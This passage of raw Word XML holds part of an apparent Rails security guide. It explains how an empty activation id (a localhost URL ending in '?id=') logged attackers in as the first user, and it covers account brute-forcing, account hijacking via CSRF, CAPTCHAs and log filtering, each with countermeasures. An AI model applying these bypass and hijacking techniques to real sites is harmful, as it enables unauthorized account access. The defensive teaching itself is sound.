      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3403"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="13F61936" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0DB09A4D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
            <w:hyperlink r:id="rId708" w:history="1">
              <w:r w:rsidR="009A002D">
                <w:rPr>
                  <w:rStyle w:val="a3"/>
                </w:rPr>
                <w:t>http://localhost:3006/user/activate</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
          <w:p w14:paraId="4B1C33A5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:hyperlink r:id="rId709" w:history="1">
              <w:r w:rsidR="009A002D">
                <w:rPr>
                  <w:rStyle w:val="a3"/>
                </w:rPr>
                <w:t>http://localhost:3006/user/activate?id=</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6331DF0B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This is possible because on some servers, this way the parameter id, as in params[:id], would be nil. However, here is the finder from the activation action:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4920"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="2C7D6D40" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0B468C34" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1275937459"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>User.find_by_activation_code(params[:id])</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="62D4F93A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If the parameter was nil, the resulting </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> query will be</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7510"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="45D26288" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1F6A2321" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1936089645"/>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users WHERE</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(users.activation_code IS</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>NULL) LIMIT 1</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="331AE86E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">And thus it found the first user in the database, returned it and logged him in. You can find out more about it in </w:t>
      </w:r>
      <w:hyperlink r:id="rId710" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>my blog post</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>It is advisable to update your plug-ins from time to time</w:t>
      </w:r>
      <w:r>
        <w:t>. Moreover, you can review your application to find more flaws like this.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A538274" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>7.1 Brute-Forcing Accounts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60C06259" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">— </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve">Brute-force attacks on accounts are trial and error attacks on the login credentials. Fend them off with more generic error messages and possibly require to enter a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>CAPTCHA</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F89D1BD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>A list of user names for your web application may be misused to brute-force the corresponding passwords, because most people don’t use sophisticated passwords. Most passwords are a combination of dictionary words and possibly numbers. So armed with a list of user names and a dictionary, an automatic program may find the correct password in a matter of minutes.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75401E97" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Because of this, most web applications will display a generic error message “user name or password not correct”, if one of these are not correct. If it said “the user name you entered has not been found”, an attacker could automatically compile a list of user names.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37E28C61" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>However, what most web application designers neglect, are the forgot-password pages. These pages often admit that the entered user name or e-mail address has (not) been found. This allows an attacker to compile a list of user names and brute-force the accounts.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09303318" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In order to mitigate such attacks, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>display a generic error message on forgot-password pages, too</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Moreover, you can </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve">require to enter a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>CAPTCHA</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve"> after a number of failed logins from a certain IP address</w:t>
      </w:r>
      <w:r>
        <w:t>. Note, however, that this is not a bullet-proof solution against automatic programs, because these programs may change their IP address exactly as often. However, it raises the barrier of an attack.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1924C8A2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>7.2 Account Hijacking</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3331A912" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">— </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>Many web applications make it easy to hijack user accounts. Why not be different and make it more difficult?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="132FF68D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>7.2.1 Passwords</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32123EFD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Think of a situation where an attacker has stolen a user’s session cookie and thus may co-use the application. If it is easy to change the password, the attacker will hijack the account with a few clicks. Or if the change-password form is vulnerable to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>CSRF</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, the attacker will be able to change the victim’s password by luring him to a web page where there is a crafted </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>IMG</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">-tag which does the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>CSRF</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. As a countermeasure, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve">make change-password forms safe against </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>CSRF</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, of course. And </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>require the user to enter the old password when changing it</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0107397E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>7.2.2 E-Mail</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D35587D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">However, the attacker may also take over the account by changing the e-mail address. After he changed it, he will go to the forgotten-password page and the (possibly new) password will be mailed to the attacker’s e-mail address. As a countermeasure </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>require the user to enter the password when changing the e-mail address, too</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5290725A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>7.2.3 Other</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A7FBBDB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Depending on your web application, there may be more ways to hijack the user’s account. In many cases </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>CSRF</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>XSS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> will help to do so. For example, as in a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>CSRF</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> vulnerability in </w:t>
      </w:r>
      <w:hyperlink r:id="rId711" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Google Mail</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve">. In this proof-of-concept attack, the victim would have been lured to a web site controlled by the attacker. On that site is a crafted </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>IMG</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">-tag which results in a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>GET</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> request that changes the filter settings of Google Mail. If the victim was logged in to Google Mail, the attacker would change the filters to forward all e-mails to his e-mail address. This is nearly as harmful as hijacking the entire account. As a countermeasure, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve">review your application logic and eliminate all </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>XSS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>CSRF</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve"> vulnerabilities</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6156718F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>7.3 CAPTCHAs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C4F7335" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">— </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve">A </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>CAPTCHA</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve"> is a challenge-response test to determine that the response is not generated by a computer. It is often used to protect comment forms from automatic spam bots by asking the user to type the letters of a distorted image. The idea of a negative </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>CAPTCHA</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve"> is not for a user to prove that he is human, but reveal that a robot is a robot.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F03A68D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">But not only spam robots (bots) are a problem, but also automatic login bots. A popular </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>CAPTCHA</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>API</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is </w:t>
      </w:r>
      <w:hyperlink r:id="rId712" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>reCAPTCHA</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> which displays two distorted images of words from old books. It also adds an angled line, rather than a distorted background and high levels of warping on the text as earlier CAPTCHAs did, because the latter were broken. As a bonus, using reCAPTCHA helps to digitize old books. </w:t>
      </w:r>
      <w:hyperlink r:id="rId713" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>ReCAPTCHA</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> is also a Rails plug-in with the same name as the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>API</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A193115" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You will get two keys from the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>API</w:t>
      </w:r>
      <w:r>
        <w:t>, a public and a private key, which you have to put into your Rails environment. After that you can use the recaptcha_tags method in the view, and the verify_recaptcha method in the controller. Verify_recaptcha will return false if the validation fails. The problem with CAPTCHAs is, they are annoying. Additionally, some visually impaired users have found certain kinds of distorted CAPTCHAs difficult to read. The idea of negative CAPTCHAs is not to ask a user to proof that he is human, but reveal that a spam robot is a bot.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="637CE5DE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Most bots are really dumb, they crawl the web and put their spam into every form’s field they can find. Negative CAPTCHAs take advantage of that and include a “honeypot” field in the form which will be hidden from the human user by </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>CSS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or JavaScript.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="498B5D6D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Here are some ideas how to hide honeypot fields by JavaScript and/or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>CSS</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="028BE808" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="340"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>position the fields off of the visible area of the page</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C512EAE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="340"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>make the elements very small or color them the same as the background of the page</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6178B6C2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="340"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>leave the fields displayed, but tell humans to leave them blank</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F081062" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The most simple negative </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>CAPTCHA</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is one hidden honeypot field. On the server side, you will check the value of the field: If it contains any text, it must be a bot. Then, you can either ignore the post or return a positive result, but not saving the post to the database. This way the bot will be satisfied and moves on. You can do this with annoying users, too.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23696CA0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can find more sophisticated negative CAPTCHAs in Ned Batchelder’s </w:t>
      </w:r>
      <w:hyperlink r:id="rId714" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>blog post</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E78F4B1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="341"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Include a field with the current </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>UTC</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> time-stamp in it and check it on the server. If it is too far in the past, or if it is in the future, the form is invalid.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="214FF77B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="341"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Randomize the field names</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13D5E09C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="341"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Include more than one honeypot field of all types, including submission buttons</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F16799F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Note that this protects you only from automatic bots, targeted tailor-made bots cannot be stopped by this. So </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>negative CAPTCHAs might not be good to protect login forms</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C447E09" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>7.4 Logging</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AA3FEBB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">— </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>Tell Rails not to put passwords in the log files.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20700F4C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">By default, Rails logs all requests being made to the web application. But log files can be a huge security issue, as they may contain login credentials, credit card numbers et cetera. When designing a web application security concept, you should also think about what will happen if an attacker got (full) access to the web server. Encrypting secrets and passwords in the database will be quite useless, if the log files list them in clear text. You can </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>filter certain request parameters from your log files</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> by appending them to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config.filter_parameters</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in the application configuration. These parameters will be marked [</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>FILTERED</w:t>
      </w:r>
      <w:r>
        <w:t>] in the log.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
